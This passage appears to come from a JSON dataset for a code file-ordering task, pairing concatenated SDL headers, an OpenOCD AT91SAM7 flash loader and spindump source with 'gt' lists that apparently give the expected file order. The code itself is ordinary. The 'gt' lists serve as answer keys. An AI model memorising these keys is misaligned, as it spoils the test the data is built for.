struct SDL_mutex SDL_mutex;\n\n\nextern DECLSPEC SDL_mutex *SDLCALL SDL_CreateMutex(void);\n\n\n#define SDL_mutexP(m)   SDL_LockMutex(m)\nextern DECLSPEC int SDLCALL SDL_LockMutex(SDL_mutex * mutex);\n\n\nextern DECLSPEC int SDLCALL SDL_TryLockMutex(SDL_mutex * mutex);\n\n\n#define SDL_mutexV(m)   SDL_UnlockMutex(m)\nextern DECLSPEC int SDLCALL SDL_UnlockMutex(SDL_mutex * mutex);\n\n\nextern DECLSPEC void SDLCALL SDL_DestroyMutex(SDL_mutex * mutex);\n\n\n\n\n\nstruct SDL_semaphore;\ntypedef struct SDL_semaphore SDL_sem;\n\n\nextern DECLSPEC SDL_sem *SDLCALL SDL_CreateSemaphore(Uint32 initial_value);\n\n\nextern DECLSPEC void SDLCALL SDL_DestroySemaphore(SDL_sem * sem);\n\n\nextern DECLSPEC int SDLCALL SDL_SemWait(SDL_sem * sem);\n\n\nextern DECLSPEC int SDLCALL SDL_SemTryWait(SDL_sem * sem);\n\n\nextern DECLSPEC int SDLCALL SDL_SemWaitTimeout(SDL_sem * sem, Uint32 ms);\n\n\nextern DECLSPEC int SDLCALL SDL_SemPost(SDL_sem * sem);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_SemValue(SDL_sem * sem);\n\n\n\n\n\nstruct SDL_cond;\ntypedef struct SDL_cond SDL_cond;\n\n\nextern DECLSPEC SDL_cond *SDLCALL SDL_CreateCond(void);\n\n\nextern DECLSPEC void SDLCALL SDL_DestroyCond(SDL_cond * cond);\n\n\nextern DECLSPEC int SDLCALL SDL_CondSignal(SDL_cond * cond);\n\n\nextern DECLSPEC int SDLCALL SDL_CondBroadcast(SDL_cond * cond);\n\n\nextern DECLSPEC int SDLCALL SDL_CondWait(SDL_cond * cond, SDL_mutex * mutex);\n\n\nextern DECLSPEC int SDLCALL SDL_CondWaitTimeout(SDL_cond * cond,\n                                                SDL_mutex * mutex, Uint32 ms);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_mutex.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'"
        ],
        "content": "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'\n:\n\n\n#ifndef samflashH\n#define samflashH\n\n#include \"platform.h\"\n\n#define FLASH_AREA_ADDR 0x100000\n\n#define FLASH_STAT_OK 0\n#define FLASH_STAT_PROGE 1\n#define FLASH_STAT_LOCKE 2\n#define FLASH_STAT_VERIFE 3\n#define FLASH_STAT_INITE 4\n\nextern unsigned int flash_page_count;\nextern unsigned int flash_page_size;\n\n\nint flash_init(void);\n\n\nint flash_page_program(uint32 *data, int page_num);\n\n\nint flash_erase_all(void);\n\n\nint flash_verify(uint32 adr, unsigned int len, uint8 *src);\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'\n:\n\n\n#ifndef platformH\n#define platformH\n\n#include \"samregs.h\"\n\n\n#define outb(_reg, _val)  (*((volatile unsigned char *)(_reg)) = (_val))\n#define outw(_reg, _val)  (*((volatile unsigned short *)(_reg)) = (_val))\n#define outr(_reg, _val)  (*((volatile unsigned int *)(_reg)) = (_val))\n\n#define inb(_reg)   (*((volatile unsigned char *)(_reg)))\n#define inw(_reg)   (*((volatile unsigned short *)(_reg)))\n#define inr(_reg)   (*((volatile unsigned int *)(_reg)))\n\n#define _BV(bit)    (1 << (bit))\n\n\ntypedef signed char int8;\ntypedef unsigned char uint8;\n\ntypedef signed short int16;\ntypedef unsigned short uint16;\n\ntypedef signed int int32;\ntypedef unsigned int uint32;\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'\n:\n\n\n\n\n#ifndef samregsH\n#define samregsH\n\n\n\n\n#define DBGU_BASE       0xFFFFF200\n\n#define DBGU_CIDR_OFF           0x00000040\n#define DBGU_CIDR   (DBGU_BASE + DBGU_CIDR_OFF)\n\n\n#define MC_BASE         0xFFFFFF00\n\n#define MC_FMR_OFF              0x00000060\n#define MC_FMR      (MC_BASE + MC_FMR_OFF)\n#define MC_FRDY                 0x00000001\n#define MC_LOCKE                0x00000004\n#define MC_PROGE                0x00000008\n#define MC_NEBP                 0x00000080\n#define MC_FWS_MASK             0x00000300\n#define MC_FWS_1R2W             0x00000000\n#define MC_FWS_2R3W             0x00000100\n#define MC_FWS_3R4W             0x00000200\n#define MC_FWS_4R4W             0x00000300\n#define MC_FMCN_MASK            0x00FF0000\n\n#define MC_FCR_OFF              0x00000064\n#define MC_FCR      (MC_BASE + MC_FCR_OFF)\n#define MC_FCMD_MASK            0x0000000F\n#define MC_FCMD_NOP             0x00000000\n#define MC_FCMD_WP              0x00000001\n#define MC_FCMD_SLB             0x00000002\n#define MC_FCMD_WPL             0x00000003\n#define MC_FCMD_CLB             0x00000004\n#define MC_FCMD_EA              0x00000008\n#define MC_FCMD_SGPB            0x0000000B\n#define MC_FCMD_CGPB            0x0000000D\n#define MC_FCMD_SSB             0x0000000F\n#define MC_PAGEN_MASK           0x0003FF00\n#define MC_KEY                  0x5A000000\n\n#define MC_FSR_OFF              0x00000068\n#define MC_FSR      (MC_BASE + MC_FSR_OFF)\n#define MC_SECURITY             0x00000010\n\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'\n:\n\n\n#include \"platform.h\"\n\n#include <flash/nor/ocl.h>\n#include \"dcc.h\"\n#include \"samflash.h\"\n\n\n#define BUFSIZE 1024\nuint32 buffer[1024];\n\nvoid cmd_flash(uint32 cmd)\n{\n\tunsigned int len;\n\tuint32 adr;\n\tuint32 chksum;\n\tunsigned int bi;\n\tunsigned int bi_start;\n\tunsigned int bi_end;\n\tunsigned int ofs;\n\tint pagenum;\n\tint result;\n\n\tadr = dcc_rd();\n\tlen = cmd&0xffff;\n\tofs = adr%flash_page_size;\n\tbi_start = ofs/4;\n\tbi_end = (ofs + len + 3)/4;\n\n\tif (bi_end > BUFSIZE) {\n\t\tdcc_wr(OCL_BUFF_OVER);\n\t\treturn;\n\t}\n\n\tchksum = OCL_CHKS_INIT;\n\tfor (bi = 0; bi < bi_end; bi++) chksum^=buffer[bi]=dcc_rd();\n\n\tif (dcc_rd() != chksum) {\n\t\tdcc_wr(OCL_CHKS_FAIL);\n\t\treturn;\n\t}\n\n\n\tfor (bi = 0; bi < bi_start; bi++) buffer[bi]=0xffffffff;\n\tfor (bi = bi_end; bi%flash_page_size; bi++) buffer[bi]=0xffffffff;\n\n\tresult = 0;\n\tpagenum = adr/flash_page_size;\n\tfor (bi = 0; bi < bi_end; bi += flash_page_size/4) {\n\t\tresult = flash_page_program(buffer + bi, pagenum++);\n\t\tif (result) break;\n\t}\n\n\n\tif (!result) result = flash_verify(adr, len, ((uint8 *)buffer) + ofs);\n\n\tdcc_wr(OCL_CMD_DONE | result);\n}\n\n\nint main (void)\n{\n\tuint32 cmd;\n\n\tfor (;;) {\n\t\tcmd = dcc_rd();\n\t\tswitch (cmd&OCL_CMD_MASK) {\n\t\t\tcase OCL_PROBE:\n\t\t\t\tdcc_wr(OCL_CMD_DONE | flash_init());\n\t\t\t\tdcc_wr(0x100000);\n\t\t\t\tdcc_wr(flash_page_count*flash_page_size);\n\t\t\t\tdcc_wr(1);\n\t\t\t\tdcc_wr(4096 | ((unsigned long) flash_page_size << 16));\n\t\t\t\tbreak;\n\t\t\tcase OCL_ERASE_ALL:\n\t\t\t\tdcc_wr(OCL_CMD_DONE | flash_erase_all());\n\t\t\t\tbreak;\n\t\t\tcase OCL_FLASH_BLOCK:\n\t\t\t\tcmd_flash(cmd);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\n\t\t\t\tdcc_wr(OCL_CMD_ERR);\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn 0;\n}\n",
        "gt": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samflash.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/main.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_assert.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_assert.h'\n:\n\n#ifndef _SDL_assert_h\n#define _SDL_assert_h\n\n#include \"SDL_config.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#ifndef SDL_ASSERT_LEVEL\n#ifdef SDL_DEFAULT_ASSERT_LEVEL\n#define SDL_ASSERT_LEVEL SDL_DEFAULT_ASSERT_LEVEL\n#elif defined(_DEBUG) || defined(DEBUG) || \\\n      (defined(__GNUC__) && !defined(__OPTIMIZE__))\n#define SDL_ASSERT_LEVEL 2\n#else\n#define SDL_ASSERT_LEVEL 1\n#endif\n#endif\n\n\n\n#if defined(_MSC_VER)\n\n    extern void __cdecl __debugbreak(void);\n    #define SDL_TriggerBreakpoint() __debugbreak()\n#elif (!defined(__NACL__) && defined(__GNUC__) && (defined(__i386__) || defined(__x86_64__)))\n    #define SDL_TriggerBreakpoint() __asm__ __volatile__ ( \"int $3\\n\\t\" )\n#elif defined(HAVE_SIGNAL_H)\n    #include <signal.h>\n    #define SDL_TriggerBreakpoint() raise(SIGTRAP)\n#else\n\n    #define SDL_TriggerBreakpoint()\n#endif\n\n#if defined(__STDC_VERSION__) && (__STDC_VERSION__ >= 199901L)\n#   define SDL_FUNCTION __func__\n#elif ((__GNUC__ >= 2) || defined(_MSC_VER))\n#   define SDL_FUNCTION __FUNCTION__\n#else\n#   define SDL_FUNCTION \"???\"\n#endif\n#define SDL_FILE    __FILE__\n#define SDL_LINE    __LINE__\n\n\n\n\n#ifdef _MSC_VER\n#define SDL_NULL_WHILE_LOOP_CONDITION (0,0)\n#else\n#define SDL_NULL_WHILE_LOOP_CONDITION (0)\n#endif\n\n#define SDL_disabled_assert(condition) \\\n    do { (void) sizeof ((condition)); } while (SDL_NULL_WHILE_LOOP_CONDITION)\n\ntypedef enum\n{\n    SDL_ASSERTION_RETRY,\n    SDL_ASSERTION_BREAK,\n    SDL_ASSERTION_ABORT,\n    SDL_ASSERTION_IGNORE,\n    SDL_ASSERTION_ALWAYS_IGNORE\n} SDL_AssertState;\n\ntypedef struct SDL_AssertData\n{\n    int always_ignore;\n    unsigned int trigger_count;\n    const char *condition;\n    const char *filename;\n    int linenum;\n    const char *function;\n    const struct SDL_AssertData *next;\n} SDL_AssertData;\n\n#if (SDL_ASSERT_LEVEL > 0)\n\n\nextern DECLSPEC SDL_AssertState SDLCALL SDL_ReportAssertion(SDL_AssertData *,\n                                                             const char *,\n                                                             const char *, int)\n#if defined(__clang__)\n#if __has_feature(attribute_analyzer_noreturn)\n\n   __attribute__((analyzer_noreturn))\n#endif\n#endif\n;\n\n\n#define SDL_enabled_assert(condition) \\\n    do { \\\n        while ( !(condition) ) { \\\n            static struct SDL_AssertData sdl_assert_data = { \\\n                0, 0, #condition, 0, 0, 0, 0 \\\n            }; \\\n            const SDL_AssertState sdl_assert_state = SDL_ReportAssertion(&sdl_assert_data, SDL_FUNCTION, SDL_FILE, SDL_LINE); \\\n            if (sdl_assert_state == SDL_ASSERTION_RETRY) { \\\n                continue;  \\\n            } else if (sdl_assert_state == SDL_ASSERTION_BREAK) { \\\n                SDL_TriggerBreakpoint(); \\\n            } \\\n            break;  \\\n        } \\\n    } while (SDL_NULL_WHILE_LOOP_CONDITION)\n\n#endif\n\n\n#if SDL_ASSERT_LEVEL == 0\n#   define SDL_assert(condition) SDL_disabled_assert(condition)\n#   define SDL_assert_release(condition) SDL_disabled_assert(condition)\n#   define SDL_assert_paranoid(condition) SDL_disabled_assert(condition)\n#elif SDL_ASSERT_LEVEL == 1\n#   define SDL_assert(condition) SDL_disabled_assert(condition)\n#   define SDL_assert_release(condition) SDL_enabled_assert(condition)\n#   define SDL_assert_paranoid(condition) SDL_disabled_assert(condition)\n#elif SDL_ASSERT_LEVEL == 2\n#   define SDL_assert(condition) SDL_enabled_assert(condition)\n#   define SDL_assert_release(condition) SDL_enabled_assert(condition)\n#   define SDL_assert_paranoid(condition) SDL_disabled_assert(condition)\n#elif SDL_ASSERT_LEVEL == 3\n#   define SDL_assert(condition) SDL_enabled_assert(condition)\n#   define SDL_assert_release(condition) SDL_enabled_assert(condition)\n#   define SDL_assert_paranoid(condition) SDL_enabled_assert(condition)\n#else\n#   error Unknown assertion level.\n#endif\n\n\n#define SDL_assert_always(condition) SDL_enabled_assert(condition)\n\n\ntypedef SDL_AssertState (SDLCALL *SDL_AssertionHandler)(\n                                 const SDL_AssertData* data, void* userdata);\n\n\nextern DECLSPEC void SDLCALL SDL_SetAssertionHandler(\n                                            SDL_AssertionHandler handler,\n                                            void *userdata);\n\n\nextern DECLSPEC SDL_AssertionHandler SDLCALL SDL_GetDefaultAssertionHandler(void);\n\n\nextern DECLSPEC SDL_AssertionHandler SDLCALL SDL_GetAssertionHandler(void **puserdata);\n\n\nextern DECLSPEC const SDL_AssertData * SDLCALL SDL_GetAssertionReport(void);\n\n\nextern DECLSPEC void SDLCALL SDL_ResetAssertionReport(void);\n\n\n\n#define SDL_assert_state SDL_AssertState\n#define SDL_assert_data SDL_AssertData\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_assert.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test_memory.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/begin_code.h'"
        ],
        "content": "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test_memory.h'\n:\n\n\n\n#ifndef SDL_test_memory_h_\n#define SDL_test_memory_h_\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\nint SDLTest_TrackAllocations(void);\n\n\nvoid SDLTest_LogAllocations(void);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test.h'\n:\n\n\n\n#ifndef SDL_test_h_\n#define SDL_test_h_\n\n#include \"SDL.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_compare.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_memory.h\"\n#include \"SDL_test_random.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/begin_code.h'\n:\n\n\n\n\n#ifdef SDL_begin_code_h\n#error Nested inclusion of begin_code.h\n#endif\n#define SDL_begin_code_h\n\n#ifndef SDL_DEPRECATED\n#  if defined(__GNUC__) && (__GNUC__ >= 4)\n#    define SDL_DEPRECATED __attribute__((deprecated))\n#  else\n#    define SDL_DEPRECATED\n#  endif\n#endif\n\n#ifndef SDL_UNUSED\n#  ifdef __GNUC__\n#    define SDL_UNUSED __attribute__((unused))\n#  else\n#    define SDL_UNUSED\n#  endif\n#endif\n\n\n#ifndef DECLSPEC\n# if defined(__WIN32__) || defined(__WINRT__) || defined(__CYGWIN__) || defined(__GDK__)\n#  ifdef DLL_EXPORT\n#   define DECLSPEC __declspec(dllexport)\n#  else\n#   define DECLSPEC\n#  endif\n# elif defined(__OS2__)\n#   ifdef BUILD_SDL\n#    define DECLSPEC    __declspec(dllexport)\n#   else\n#    define DECLSPEC\n#   endif\n# else\n#  if defined(__GNUC__) && __GNUC__ >= 4\n#   define DECLSPEC __attribute__ ((visibility(\"default\")))\n#  else\n#   define DECLSPEC\n#  endif\n# endif\n#endif\n\n\n#ifndef SDLCALL\n#if (defined(__WIN32__) || defined(__WINRT__) || defined(__GDK__)) && !defined(__GNUC__)\n#define SDLCALL __cdecl\n#elif defined(__OS2__) || defined(__EMX__)\n#define SDLCALL _System\n# if defined (__GNUC__) && !defined(_System)\n#  define _System\n# endif\n#else\n#define SDLCALL\n#endif\n#endif\n\n\n#ifdef __SYMBIAN32__\n#undef DECLSPEC\n#define DECLSPEC\n#endif\n\n\n#if defined(_MSC_VER) || defined(__MWERKS__) || defined(__BORLANDC__)\n#ifdef _MSC_VER\n#pragma warning(disable: 4103)\n#endif\n#ifdef __clang__\n#pragma clang diagnostic ignored \"-Wpragma-pack\"\n#endif\n#ifdef __BORLANDC__\n#pragma nopackwarning\n#endif\n#ifdef _WIN64\n\n#pragma pack(push,8)\n#else\n#pragma pack(push,4)\n#endif\n#endif\n\n#ifndef SDL_INLINE\n#if defined(__GNUC__)\n#define SDL_INLINE __inline__\n#elif defined(_MSC_VER) || defined(__BORLANDC__) || \\\n      defined(__DMC__) || defined(__SC__) || \\\n      defined(__WATCOMC__) || defined(__LCC__) || \\\n      defined(__DECC) || defined(__CC_ARM)\n#define SDL_INLINE __inline\n#ifndef __inline__\n#define __inline__ __inline\n#endif\n#else\n#define SDL_INLINE inline\n#ifndef __inline__\n#define __inline__ inline\n#endif\n#endif\n#endif\n\n#ifndef SDL_FORCE_INLINE\n#if defined(_MSC_VER)\n#define SDL_FORCE_INLINE __forceinline\n#elif ( (defined(__GNUC__) && (__GNUC__ >= 4)) || defined(__clang__) )\n#define SDL_FORCE_INLINE __attribute__((always_inline)) static __inline__\n#else\n#define SDL_FORCE_INLINE static SDL_INLINE\n#endif\n#endif\n\n#ifndef SDL_NORETURN\n#if defined(__GNUC__)\n#define SDL_NORETURN __attribute__((noreturn))\n#elif defined(_MSC_VER)\n#define SDL_NORETURN __declspec(noreturn)\n#else\n#define SDL_NORETURN\n#endif\n#endif\n\n\n#if !defined(__MACH__)\n#ifndef NULL\n#ifdef __cplusplus\n#define NULL 0\n#else\n#define NULL ((void *)0)\n#endif\n#endif\n#endif\n\n#ifndef SDL_FALLTHROUGH\n#if (defined(__cplusplus) && __cplusplus >= 201703L) || \\\n    (defined(__STDC_VERSION__) && __STDC_VERSION__ >= 202000L)\n#define SDL_FALLTHROUGH [[fallthrough]]\n#else\n#if defined(__has_attribute)\n#define SDL_HAS_FALLTHROUGH __has_attribute(__fallthrough__)\n#else\n#define SDL_HAS_FALLTHROUGH 0\n#endif\n#if SDL_HAS_FALLTHROUGH && \\\n   ((defined(__GNUC__) && __GNUC__ >= 7) || \\\n    (defined(__clang_major__) && __clang_major__ >= 10))\n#define SDL_FALLTHROUGH __attribute__((__fallthrough__))\n#else\n#define SDL_FALLTHROUGH do {} while (0)\n#endif\n#undef SDL_HAS_FALLTHROUGH\n#endif\n#endif\n",
        "gt": [
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/begin_code.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test_memory.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'spindump/src/spindump_eventformatter_json.c'",
            "'spindump/src/spindump_json_value.h'",
            "'spindump/src/spindump_event_printer_json.h'"
        ],
        "content": "'spindump/src/spindump_eventformatter_json.c'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include \"spindump_util.h\"\n#include \"spindump_eventformatter.h\"\n#include \"spindump_eventformatter_json.h\"\n#include \"spindump_event.h\"\n#include \"spindump_event_parser_json.h\"\n#include \"spindump_event_printer_json.h\"\n\n\n\n\n\n\n\n\n\nunsigned long\nspindump_eventformatter_measurement_beginlength_json(struct spindump_eventformatter* formatter) {\n  return(2);\n}\n\n\n\n\n\nconst uint8_t*\nspindump_eventformatter_measurement_begin_json(struct spindump_eventformatter* formatter) {\n  return((const uint8_t*)\"[\\n\");\n}\n\n\n\n\n\nunsigned long\nspindump_eventformatter_measurement_midlength_json(struct spindump_eventformatter* formatter) {\n  return(2);\n}\n\n\n\n\n\nconst uint8_t*\nspindump_eventformatter_measurement_mid_json(struct spindump_eventformatter* formatter) {\n  return((const uint8_t*)\",\\n\");\n}\n\n\n\n\n\nunsigned long\nspindump_eventformatter_measurement_endlength_json(struct spindump_eventformatter* formatter) {\n  return(3);\n}\n\n\n\n\n\nconst uint8_t*\nspindump_eventformatter_measurement_end_json(struct spindump_eventformatter* formatter) {\n  return((const uint8_t*)\"\\n]\\n\");\n}\n\n\n\n\n\n\nvoid\nspindump_eventformatter_measurement_one_json(struct spindump_eventformatter* formatter,\n                                             spindump_analyze_event event,\n                                             const struct spindump_event* eventobj,\n                                             struct spindump_connection* connection) {\n\n  char buf[400];\n  size_t consumed;\n  spindump_event_printer_json_print(eventobj,buf,sizeof(buf)-1,&consumed);\n  spindump_assert(consumed < sizeof(buf));\n  buf[consumed] = 0;\n\n\n\n\n\n  spindump_eventformatter_deliverdata(formatter,0,strlen(buf),(uint8_t*)buf);\n\n}\n\n'spindump/src/spindump_json_value.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_JSON_VALUE_H\n#define SPINDUMP_JSON_VALUE_H\n\n\n\n\n\n#include \"spindump_util.h\"\n\n\n\n\n\nenum spindump_json_value_type {\n  spindump_json_value_type_integer = 0,\n  spindump_json_value_type_string = 1,\n  spindump_json_value_type_record = 2,\n  spindump_json_value_type_array = 3\n};\n\n\n\n\n\nstruct spindump_json_value_array {\n  unsigned int n;\n  struct spindump_json_value** elements;\n};\n\nstruct spindump_json_value_field {\n  char* name;\n  struct spindump_json_value* value;\n};\n\nstruct spindump_json_value_record {\n  unsigned int nSchemaFields;\n  struct 